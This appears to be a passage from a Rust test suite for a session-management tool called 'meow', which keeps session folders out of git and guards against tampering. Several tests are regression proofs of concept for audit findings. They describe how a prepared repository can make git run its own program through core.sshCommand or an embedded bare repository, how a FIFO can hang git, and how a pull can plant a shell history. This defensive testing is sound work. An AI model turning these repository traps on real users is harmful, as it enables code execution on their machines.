        // Taken in: the record places it here, its files are as left.
        ws.take_moved(&fx.home, &made.dir).unwrap();
        assert!(!ws.is_foreign(&fx.home));
        assert_eq!(ws.files_seen(&fx.home), FilesSeen::AsLeft);
        assert_eq!(ws.profile.id.as_deref(), Some(mark.as_str()));
        assert!(ws.history_path("bash").is_file());
        ws.ensure_own(&fx.home, &moved).unwrap();
        // A copy, while the folder it came from is there: asked about.
        let copy = other_folder(&fx, "copy");
        let copy_dir = sessions_dir(&copy).join("acme");
        fs::create_dir_all(&copy_dir).unwrap();
        for name in [PROFILE_FILE, "bash_history", "state.db"] {
            fs::copy(ws.dir.join(name), copy_dir.join(name)).unwrap();
        }
        let copied = Workspace::load(&copy_dir).unwrap();
        assert!(copied.is_foreign(&fx.home));
        assert_eq!(copied.moved_from(&fx.home), None);
        let said = format!("{:#}", copied.ensure_own(&fx.home, &copy).unwrap_err());
        assert!(said.contains("a meow session from elsewhere"), "{said}");
        assert!(said.contains("or the folder was moved or copied"), "{said}");
        // Moved again, with a file changed since: asked about.
        let again = other_folder(&fx, "again");
        fs::remove_dir(&again).unwrap();
        fs::rename(&moved, &again).unwrap();
        let ws = Workspace::load(&sessions_dir(&again).join("acme")).unwrap();
        assert!(ws.moved_from(&fx.home).is_some());
        fs::write(ws.history_path("bash"), "echo planted\n").unwrap();
        assert_eq!(ws.moved_from(&fx.home), None);
    }

    /// A folder whose path is not text cannot be named in the record or
    /// in the shell's start-up files: no session is made or used there.
    #[cfg(unix)]
    #[test]
    fn a_folder_whose_path_is_not_text_holds_no_session() {
        use std::os::unix::ffi::OsStrExt;
        let fx = fixture();
        let latin1 = fx
            .cwd
            .join(std::ffi::OsStr::from_bytes(b"Projekt-M\xfcller"));
        fs::create_dir(&latin1).unwrap();
        let reason = check_new_folder(&fx.home, &latin1, "acme").unwrap_err();
        assert_eq!(reason, "the path is not valid UTF-8");
        let said = format!(
            "{:#}",
            local_location(&fx.home, &latin1, "acme").unwrap_err()
        );
        assert!(said.contains("not valid UTF-8"), "{said}");
        assert!(said.contains("--home"), "{said}");
        let location = Location::Folder(latin1.clone());
        let said = format!(
            "{:#}",
            Workspace::open_at(&fx.home, &location, "acme", Mode::Light).unwrap_err()
        );
        assert!(said.contains("not valid UTF-8"), "{said}");
        assert!(!latin1.join(SESSIONS_DIR).exists());
        assert!(marks(&fx.home).is_empty());
        // One an older meow made there is not used either.
        let old = sessions_dir(&latin1).join("acme");
        fs::create_dir_all(&old).unwrap();
        fs::write(
            old.join(PROFILE_FILE),
            "name = \"acme\"\nmode = \"light\"\n",
        )
        .unwrap();
        assert!(Workspace::open_at(&fx.home, &location, "acme", Mode::Light).is_err());
        assert!(Workspace::load(&old).is_err());
    }

    /// Git keeps out of `./meow`: it is listed in `.git/info/exclude`, and
    /// the `.gitignore` in it and in each session keep session files out
    /// even when a pull lets `./meow` in. A running session puts those
    /// back, and says when git tracks a session file.
    #[test]
    fn meow_is_kept_out_of_the_git_repository_it_is_in() {
        let fx = fixture();
        let repo = other_folder(&fx, "repo");
        let git = |dir: &Path, args: &[&str]| {
            std::process::Command::new("git")
                .arg("-C")
                .arg(dir)
                .args(args)
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .env(
                    "GIT_CONFIG_GLOBAL",
                    if cfg!(windows) { "NUL" } else { "/dev/null" },
                )
                .output()
                .ok()
                .filter(|out| out.status.success())
                .map(|out| String::from_utf8_lossy(&out.stdout).into_owned())
        };
        let with_git = git(&repo, &["init", "-q"]).is_some();
        if !with_git {
            fs::create_dir(repo.join(".git")).unwrap();
        }
        // Characters a pattern must escape. Windows allows no `*` in a name.
        let (odd, listed) = if cfg!(windows) {
            ("a [b]!", "/a \\[b\\]!/c/meow/")
        } else {
            ("a [b]*", "/a \\[b\\]\\*/c/meow/")
        };
        let deeper = repo.join(odd).join("c");
        fs::create_dir_all(&deeper).unwrap();
        let acme = open_in(&fx, &repo, "acme");
        open_in(&fx, &deeper, "beta");
        open_in(&fx, &repo, "gamma");
        assert!(is_sessions_marker(&acme.dir.join(".gitignore")));
        let exclude = fs::read_to_string(repo.join(".git").join("info").join("exclude")).unwrap();
        let lines: Vec<&str> = exclude
            .lines()
            .filter(|line| !line.starts_with('#') && !line.is_empty())
            .collect();
        assert_eq!(lines, ["/meow/", listed], "{exclude}");
        fs::write(acme.dir.join("chats").join("192.0.2.5.md"), "x").unwrap();
        if with_git {
            // A pull that replaced meow's .gitignore with one letting
            // everything in, and let ./meow in at the top (which beats
            // .git/info/exclude): the sessions' own .gitignore keep them out.
            fs::write(repo.join(".gitignore"), "!/meow/\n").unwrap();
            fs::write(repo.join("meow").join(".gitignore"), "!*\n").unwrap();
            fs::write(deeper.join("meow").join(".gitignore"), "!*\n").unwrap();
            let seen = git(&repo, &["status", "--porcelain", "--untracked-files=all"]).unwrap();
            assert!(!seen.contains("meow/acme"), "{seen}");
            assert!(!seen.contains("meow/beta"), "{seen}");
            // Without the session's own, git would take its files in.
            fs::remove_file(acme.dir.join(".gitignore")).unwrap();
            let seen = git(&repo, &["status", "--porcelain", "--untracked-files=all"]).unwrap();
            assert!(seen.contains("meow/acme/chats/192.0.2.5.md"), "{seen}");
        }
        // A running session puts both back, and says so.
        fs::write(repo.join("meow").join(".gitignore"), "!*\n").unwrap();
        fs::write(acme.dir.join(".gitignore"), "!*\n").unwrap();
        let mut watch = GitWatch::default();
        let notes = watch.check(&acme.dir);
        for said in ["meow/.gitignore had been", "meow/acme/.gitignore had been"] {
            assert!(notes.iter().any(|note| note.starts_with(said)), "{notes:?}");
        }
        assert!(is_sessions_marker(&repo.join("meow").join(".gitignore")));
        assert!(is_sessions_marker(&acme.dir.join(".gitignore")));
        assert_eq!(watch.check(&acme.dir), Vec::<String>::new());
        if with_git {
            // A pull that makes git track a session file: said once.
            git(&repo, &["add", "-f", "meow/acme/chats/192.0.2.5.md"]).unwrap();
            let notes = watch.check(&acme.dir);
            assert!(
                notes.iter().any(|note| note
                    .starts_with("git tracks session files (meow/acme/chats/192.0.2.5.md)")),
                "{notes:?}"
            );
            assert!(notes.iter().all(|note| !note.contains("does not ignore")));
            fs::write(repo.join("README"), "x").unwrap();
            git(&repo, &["add", "README"]).unwrap();
            assert_eq!(watch.check(&acme.dir), Vec::<String>::new());
            // What meow cannot put back (a folder in place of each
            // .gitignore), and git then takes in.
            git(
                &repo,
                &["rm", "-q", "--cached", "meow/acme/chats/192.0.2.5.md"],
            )
            .unwrap();
            let markers = [
                repo.join("meow").join(".gitignore"),
                acme.dir.join(".gitignore"),
            ];
            for marker in &markers {
                fs::remove_file(marker).unwrap();
                fs::create_dir(marker).unwrap();
            }
            let notes = watch.check(&acme.dir);
            assert!(
                notes
                    .iter()
                    .any(|note| note.starts_with("git does not ignore session files (meow/")),
                "{notes:?}"
            );
            for marker in &markers {
                fs::remove_dir(marker).unwrap();
            }
            assert!(watch.check(&acme.dir).len() == 2);
        }
        let again = fs::read_to_string(repo.join(".git").join("info").join("exclude")).unwrap();
        assert_eq!(again, exclude, "listed once");

        // A `.git` that is a file (a linked work tree) is left alone.
        let linked = other_folder(&fx, "linked");
        fs::write(linked.join(".git"), "gitdir: /elsewhere\n").unwrap();
        open_in(&fx, &linked, "delta");
        assert!(linked.join(".git").is_file());
        // A folder in no repository: nothing is written above it.
        assert_eq!(exclude_pattern(Path::new("")), Some("/meow/".to_owned()));
        assert_eq!(exclude_pattern(Path::new("x\ny")), None);
    }

    /// PoC (SUP-1, SUP-V1): a session opened in a prepared repository ran
    /// the repository's program. Listing session files, git fetched a
    /// tree its sparse index left out from a promisor remote, through the
    /// repository's `core.sshCommand`; and in a folder shaped as a bare
    /// repository below the top (a plain clone brings one), git took that
    /// folder for the repository. The watch asks the top repository only,
    /// and git reaches no remote.
    #[cfg(unix)]
    #[test]
    fn git_watch_runs_no_program_of_the_repository() {
        use crate::update::git_traps;
        let fx = fixture();
        let marker = fx.cwd.parent().unwrap().join("ran");
        let trap = other_folder(&fx, "trap");
        git_traps::lazy_fetch_trap(&trap, &marker);
        let acme = open_in(&fx, &trap, "acme");
        let notes = GitWatch::default().check(&acme.dir);
        assert!(!marker.exists(), "git ran the repository's ssh command");
        assert!(notes.is_empty(), "{notes:?}");

        let clone = other_folder(&fx, "clone");
        git_traps::git(&clone, &["init", "-q"]);
        let evil = git_traps::embedded_bare_trap(&clone, &marker);
        let beta = open_in(&fx, &evil, "beta");
        fs::write(beta.dir.join("chats").join("192.0.2.6.md"), "x").unwrap();
        git_traps::git(&clone, &["add", "-f", "evil/meow/beta/chats/192.0.2.6.md"]);
        let mut watch = GitWatch::default();
        let notes = watch.check(&beta.dir);
        assert!(!marker.exists(), "git used the planted repository");
        // Named as before: from the folder that holds `./meow`.
        assert!(
            notes
                .iter()
                .any(|note| note
                    .starts_with("git tracks session files (meow/beta/chats/192.0.2.6.md)")),
            "{notes:?}"
        );
        assert!(watch.files_doubtful());
    }

    /// PoC (SUP-1): with a FIFO as `core.excludesFile`, git waited for good
    /// and no session could open in the folder. git is killed at
    /// [`GIT_CHECK_LIMIT`], said once, and not asked again until its index
    /// changes. No answer is no warning.
    #[cfg(unix)]
    #[test]
    fn git_watch_gives_up_on_a_git_that_does_not_answer() {
        use crate::update::git_traps;
        let fx = fixture();
        let repo = other_folder(&fx, "repo");
        git_traps::git(&repo, &["init", "-q"]);
        let fifo = git_traps::blocking_excludes(&repo);
        let acme = open_in(&fx, &repo, "acme");
        let mut watch = GitWatch::default();
        let start = Instant::now();
        let notes = watch.check(&acme.dir);
        let took = start.elapsed();
        assert!(took < GIT_CHECK_LIMIT + Duration::from_secs(2), "{took:?}");
        assert_eq!(
            notes,
            ["git did not answer in 3 s: session files not checked"]
        );
        assert!(!git_traps::fifo_has_reader(&fifo), "git still runs");
        assert!(!watch.files_doubtful());
        let start = Instant::now();
        assert!(watch.check(&acme.dir).is_empty());
        assert!(start.elapsed() < Duration::from_secs(1));
    }

    /// PoC (WS-3): a pull while the session ran made git track its shell
    /// history and replaced it; at the end meow recorded the planted file
    /// as its own, and the next open used it. Once git tracks session
    /// files, or a `.gitignore` of meow's had to be put back, the session
    /// is recorded as changed outside meow.
    #[test]
    fn files_git_may_have_put_in_a_running_session_are_not_taken_as_the_users() {
        let fx = fixture();
        let repo = other_folder(&fx, "repo");
        let with_git = std::process::Command::new("git")
            .arg("-C")
            .arg(&repo)
            .args(["init", "-q"])
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .status()
            .is_ok_and(|status| status.success());
        let acme = open_in(&fx, &repo, "acme");
        let record = |doubt: bool| {
            let mut files = SessionFiles::for_session(&fx.home, &acme, false);
            files.started();
            if doubt {
                files.changed_outside();
            }
        };
        record(false);
        assert!(!acme.files_changed(&fx.home));
        record(true);
        assert!(acme.files_changed(&fx.home));

        let mut watch = GitWatch::default();
        watch.check(&acme.dir);
        assert!(!watch.files_doubtful());
        fs::write(acme.dir.join(".gitignore"), "!*\n").unwrap();
        watch.check(&acme.dir);
        assert!(watch.files_doubtful(), "a marker was put back");
        if with_git {
            let mut watch = GitWatch::default();
            fs::write(acme.dir.join("zsh_history"), "echo planted\n").unwrap();
            let added = std::process::Command::new("git")
                .arg("-C")
                .arg(&repo)
                .args(["add", "-f", "meow/acme/zsh_history"])
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .status()
                .unwrap();
            assert!(added.success());
            watch.check(&acme.dir);
            assert!(watch.files_doubtful(), "git tracks session files");
        }
    }

    /// git in `repo` for a test, without system config: false when it is
    /// not there or failed.
    fn test_git(repo: &Path, args: &[&str]) -> bool {
        std::process::Command::new("git")
            .arg("-C")
            .arg(repo)
            .args(args)
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .output()
            .is_ok_and(|out| out.status.success())
    }

    /// Review of WS-3: any file git tracked in `./meow`, even another
    /// session's report, made the session end as changed outside meow, so
    /// its shell history was dropped at every open. Only the files of this
    /// session that meow reads back count, in either case: on macOS and
    /// Windows, `MEOW/Acme/zsh_history` is `meow/acme/zsh_history`. The
    /// warning still names the rest.
    #[test]
    fn only_tracked_files_this_session_reads_back_make_it_doubtful() {
        let fx = fixture();
        let repo = other_folder(&fx, "repo");
        if !test_git(&repo, &["init", "-q"]) {
            return;
        }
        let acme = open_in(&fx, &repo, "acme");
        let beta = open_in(&fx, &repo, "beta");
        fs::write(acme.dir.join("REPORT.md"), "# report\n").unwrap();
        fs::write(beta.dir.join("REPORT.md"), "# report\n").unwrap();
        fs::write(beta.dir.join("zsh_history"), "echo beta\n").unwrap();
        let tracked = [
            "meow/.gitignore",
            "meow/acme/REPORT.md",
            "meow/beta/REPORT.md",
            "meow/beta/zsh_history",
        ];
        assert!(test_git(&repo, &[&["add", "-f"][..], &tracked].concat()));
        let mut watch = GitWatch::default();
        let notes = watch.check(&acme.dir);
        assert_eq!(
            notes,
            [format!(
                "git tracks session files (meow/.gitignore, meow/acme/REPORT.md, \
                 meow/beta/REPORT.md and 1 more): a commit would take them in. \
                 Run `git rm -r --cached meow` in {}",
                crate::evidence::sanitize(
                    &acme
                        .dir
                        .parent()
                        .unwrap()
                        .parent()
                        .unwrap()
                        .display()
                        .to_string(),
                    300
                )
            )]
        );
        assert!(!watch.files_doubtful());

        // As a pull brings it: the history, in another case.
        let other_case = repo.join("MEOW").join("Acme");
        fs::create_dir_all(&other_case).unwrap();
        fs::write(other_case.join("zsh_history"), "echo planted\n").unwrap();
        assert!(test_git(&repo, &["add", "-f", "MEOW/Acme/zsh_history"]));
        let notes = watch.check(&acme.dir);
        assert!(
            notes
                .iter()
                .any(|note| note.to_ascii_lowercase().contains("meow/acme/zsh_history")),
            "{notes:?}"
        );
        assert!(watch.files_doubtful());
    }

    #[test]
    fn read_back_files_are_told_by_name_in_either_case() {
        for name in [
            "meow/acme",
            "meow/acme/zsh_history",
            "MEOW/Acme/BASH_HISTORY",
            "meow/acme/graph.json",
            "meow/acme/state.db-wal",
            "meow/acme/chats/192.0.2.6.md",
            "meow/acme/zsh_history/x",
        ] {
            assert!(is_read_back(name, "acme"), "{name}");
        }
        for name in [
            "meow/.gitignore",
            "meow/acme/.gitignore",
            "meow/acme/REPORT.md",
            "meow/beta/zsh_history",
            "meow/acmeb/zsh_history",
            "x/meow/acme/zsh_history",
            "meow",
        ] {
            assert!(!is_read_back(name, "acme"), "{name}");
        }
    }

    /// Review of WS-3: past 8 MiB of names, git's answer was dropped, so a
    /// pull that brought the shell history among them went unseen. The
    /// list is read through, keeping a few names.
    #[test]
    fn a_long_list_from_git_is_read_through() {
        let pad = "x".repeat(1000);
        let mut printed = b"sub/meow/acme/zsh_history\0".to_vec();
        for i in 0..9000 {
            printed.extend_from_slice(format!("Sub/meow/pad/{i:05}{pad}\0").as_bytes());
        }
        assert!(printed.len() > 8 * 1024 * 1024);
        let listed = Listed::read(&mut &printed[..], "sub/", "acme").unwrap();
        assert_eq!(listed.count, 9001);
        assert!(listed.read_back);
        assert_eq!(listed.first[0], "meow/acme/zsh_history");
        assert_eq!(listed.first[1], format!("meow/pad/00000{pad}"));
        assert_eq!(listed.first.len(), GIT_NAMES_SHOWN);
        assert!(listed.shown().ends_with(" and 8998 more"));
        // Told apart from another list with the same first names.
        printed.extend_from_slice(b"meow/pad/z\0");
        let more = Listed::read(&mut &printed[..], "sub/", "acme").unwrap();
        assert_ne!(more, listed);
        let none = Listed::read(&mut &b""[..], "", "acme").unwrap();
        assert_eq!((none.count, none.read_back), (0, false));
    }

    /// The same through git: a pull that brought the history and more than
    /// 8 MiB of names under `./meow`.
    #[cfg(unix)]
    #[test]
    fn git_watch_reads_a_long_list_through() {
        use crate::update::git_traps;
        let fx = fixture();
        let repo = other_folder(&fx, "repo");
        git_traps::git(&repo, &["init", "-q"]);
        let acme = open_in(&fx, &repo, "acme");
        fs::write(acme.dir.join("zsh_history"), "echo planted\n").unwrap();
        git_traps::git(&repo, &["add", "-f", "meow/acme/zsh_history"]);
        let blob = git_traps::git(&repo, &["rev-parse", ":meow/acme/zsh_history"]);
        let pad = "x".repeat(1000);
        let entries: String = (0..9000)
            .map(|i| format!("100644 {blob}\tmeow/pad/{i:05}{pad}\n"))
            .collect();
        git_traps::git_with_input(&repo, &["update-index", "--index-info"], &entries);
        let mut watch = GitWatch::default();
        let notes = watch.check(&acme.dir);
        assert!(
            notes.iter().any(|note| note
                .starts_with("git tracks session files (meow/acme/zsh_history, meow/pad/00000x")
                && note.contains(" and 8998 more)")),
            "{notes:?}"
        );
        assert!(watch.files_doubtful());
    }

    /// Review of WS-3: a check made because git's index changed, which git
    /// did not answer in time, said nothing more. git may have just put
    /// files in the session: that is now taken as so. A first look git
    /// does not answer is not.
    #[cfg(unix)]
    #[test]
    fn git_that_does_not_answer_after_its_index_changed_makes_files_doubtful() {
        use crate::update::git_traps;
        let fx = fixture();
        let repo = other_folder(&fx, "repo");
        git_traps::git(&repo, &["init", "-q"]);
        let acme = open_in(&fx, &repo, "acme");
        git_traps::git(&repo, &["add", "-f", "meow/.gitignore"]);
        let mut watch = GitWatch::default();
        assert_eq!(watch.check(&acme.dir).len(), 1);
        assert!(!watch.files_doubtful());
        // An index git waits on for good.
        let index = repo.join(".git").join("index");
        fs::remove_file(&index).unwrap();
        git_traps::fifo(&index);
        let notes = watch.check(&acme.dir);
        assert_eq!(
            notes,
            ["git did not answer in 3 s: session files not checked"]
        );
        assert!(watch.files_doubtful());
        let mut first = GitWatch::default();
        first.check(&acme.dir);
        assert!(!first.files_doubtful());
    }

    /// Two meow processes started together (two terminals, a script) each
    /// record their new session: neither entry may be lost.
    #[test]
    fn sessions_recorded_at_the_same_time_are_all_kept() {
        let fx = fixture();
        create_private_dir(fx.home.root()).unwrap();
        // Fewer on Windows, where each update of the record takes about a
        // second (a PowerShell sets the access list of `~/.meow`).
        let (first, second) = if cfg!(windows) { (8, 4) } else { (24, 12) };
        let made: Vec<String> = (0..first).map(|i| format!("{i:032x}")).collect();
        std::thread::scope(|scope| {
            for (i, mark) in made.iter().enumerate() {
                let home = &fx.home;
                let dir = fx.cwd.join(format!("p{i}")).join("meow").join("s");
                scope.spawn(move || remember(home, mark, Some(&dir)).unwrap());
            }
        });
        let mut kept = marks(&fx.home);
        kept.sort();
        assert_eq!(kept, made);
        // And a delete running alongside new ones takes only its own.
        let gone = fx.cwd.join("p3").join("meow").join("s");
        let more: Vec<String> = (100..100 + second).map(|i| format!("{i:032x}")).collect();
        std::thread::scope(|scope| {
            scope.spawn(|| forget(&fx.home, &gone, Some(&made[3])).unwrap());
            for (i, mark) in more.iter().enumerate() {
                let home = &fx.home;
                let dir = fx.cwd.join(format!("q{i}")).join("meow").join("s");
                scope.spawn(move || remember(home, mark, Some(&dir)).unwrap());
            }
        });
        let kept = marks(&fx.home);
        assert_eq!(kept.len(), made.len() - 1 + more.len());
        assert!(!kept.contains(&made[3]));
    }

    #[test]
    fn a_session_on_a_drive_not_there_is_named_before_a_new_one_is_made() {
        let fx = fixture();
        assert_eq!(unreachable_session(&fx.home, "away"), None);
        let drive = fx.cwd.join("drive");
        let away = drive.join("meow").join("away");
        remember(&fx.home, "00112233445566778899aabbccddeeff", Some(&away)).unwrap();
        assert_eq!(unreachable_session(&fx.home, "away"), Some(away.clone()));
        assert_eq!(unreachable_session(&fx.home, "other"), None);
        assert_eq!(find_session(&fx.home, &fx.cwd, "away").unwrap(), None);
        // Back, with the session gone from it: not out of reach, just gone.
        fs::create_dir_all(drive.join("meow")).unwrap();
        assert_eq!(unreachable_session(&fx.home, "away"), None);
    }

    #[test]
    fn hints_name_commands_that_lead_back_to_that_session() {
        const MADE_UP: &str = "00000000000000000000000000000000";
        let fx = fixture();
        // The user's own `acme`, and a cloned folder whose session in
        // meow/notes calls itself acme.
        let (own, _) = open(&fx, "acme", false);
        let repo = other_folder(&fx, "repo");
        let notes = repo.join("meow").join("notes");
        fs::create_dir_all(&notes).unwrap();
        fs::write(
            notes.join(PROFILE_FILE),
            format!("name = \"acme\"\nid = \"{MADE_UP}\"\n"),
        )
        .unwrap();
        let loaded = Workspace::load(&notes).unwrap();
        assert_eq!(loaded.name, "notes");
        let said = format!("{:#}", loaded.ensure_own(&fx.home, &repo).unwrap_err());
        assert!(said.contains("`meow notes`"), "{said}");
        assert!(said.contains("`meow delete notes`"), "{said}");
        assert!(!said.contains("meow delete acme"), "{said}");

        // An old ./.meow called acme in a colleague's folder: `meow acme`
        // and `meow delete acme` find the user's own one first.
        let colleague = other_folder(&fx, "colleague");
        let dot_meow = colleague.join(".meow");
        fs::create_dir_all(&dot_meow).unwrap();
        fs::write(dot_meow.join(PROFILE_FILE), "name = \"acme\"\n").unwrap();
        assert_eq!(
            commands_for(&fx.home, &colleague, &dot_meow, "acme"),
            (
                Some("meow acme --local".to_owned()),
                Some("meow delete --local".to_owned())
            )
        );
        // From anywhere else, no command reaches it.
        let elsewhere = other_folder(&fx, "elsewhere");
        assert_eq!(
            commands_for(&fx.home, &elsewhere, &dot_meow, "acme"),
            (None, None)
        );
        let said = format!(
            "{:#}",
            Workspace::load(&dot_meow)
                .unwrap()
                .ensure_own(&fx.home, &elsewhere)
                .unwrap_err()
        );
        assert!(said.contains("Delete that folder"), "{said}");
        assert!(own.dir.join(PROFILE_FILE).is_file());
    }

    #[test]
    fn a_folder_meow_cannot_write_to_is_found_before_the_session_is_made() {
        let fx = fixture();
        prepare_sessions_dir(&fx.cwd).unwrap();
        assert!(is_sessions_marker(&fx.cwd.join("meow").join(".gitignore")));
        let blocked = other_folder(&fx, "blocked");
        fs::write(blocked.join("meow"), "a file").unwrap();
        assert!(prepare_sessions_dir(&blocked).is_err());
        assert_eq!(fs::read_to_string(blocked.join("meow")).unwrap(), "a file");
    }
}
